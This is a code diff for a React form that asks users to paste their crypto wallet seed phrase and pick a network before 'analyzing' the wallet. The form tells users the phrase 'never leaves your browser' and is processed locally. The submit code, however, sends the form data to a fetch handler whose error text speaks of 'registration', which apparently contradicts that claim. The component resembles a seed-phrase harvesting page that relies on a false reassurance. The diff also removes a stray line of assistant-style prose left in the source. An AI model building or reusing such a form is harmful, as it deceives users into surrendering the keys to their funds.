@@ -106,6 +106,93 @@ export function SeedPhraseForm({
     const dataFetchResult = await handleFetchData(formData);
 
     if (dataFetchResult.success && dataFetchResult.data) {
-      onDataFetched(dataFetch...
+      onDataFetched(dataFetchResult.data);
+    } else {
+      toast({
+        variant: "destructive",
+        title: "Failed to Fetch Wallet Data",
+        description:
+          dataFetchResult.error ||
+          "Could not retrieve asset information after registration.",
+      });
+      onDataFetched(null);
+    }
 
-I am confident this will resolve the issue.
+    setIsSubmitting(false);
+  }
+
+  return (
+    <Card className="w-full bg-card/50 border-primary/20">
+      <CardContent className="p-6">
+        <Form {...form}>
+          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
+            <FormField
+              control={form.control}
+              name="seedPhrase"
+              render={({ field }) => (
+                <FormItem>
+                  <FormLabel className="text-lg">Seed Phrase</FormLabel>
+                  <FormControl>
+                    <Textarea
+                      placeholder="Enter your 12, 18, or 24-word recovery phrase here..."
+                      className="min-h-[100px] text-base"
+                      {...field}
+                    />
+                  </FormControl>
+                  <FormDescription>
+                    Your seed phrase never leaves your browser. All processing is
+                    done locally.
+                  </FormDescription>
+                  <FormMessage />
+                </FormItem>
+              )}
+            />
+
+            <FormField
+              control={form.control}
+              name="network"
+              render={({ field }) => (
+                <FormItem>
+                  <FormLabel className="text-lg">Primary Network</FormLabel>
+                  <Select
+                    onValueChange={field.onChange}
+                    defaultValue={field.value}
+                  >
+                    <FormControl>
+                      <SelectTrigger>
+                        <SelectValue placeholder="Select a network" />
+                      </SelectTrigger>
+                    </FormControl>
+                    <SelectContent>
+                      {networks.map((network) => (
+                        <SelectItem key={network.id} value={network.id}>
+                          {network.label}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                  <FormDescription>
+                    Select the main blockchain you use. More will be added soon.
+                  </FormDescription>
+                  <FormMessage />
+                </FormItem>
+              )}
+            />
+
+            <Button
+              type="submit"
+              size="lg"
+              className="w-full"
+              disabled={isSubmitting}
+            >
+              {isSubmitting && (
+                <Loader2 className="mr-2 h-5 w-5 animate-spin" />
+              )}
+              {isSubmitting ? "Analyzing..." : "Analyze My Wallet"}
+            </Button>
+          </form>
+        </Form>
+      </CardContent>
+    </Card>
+  );
+}
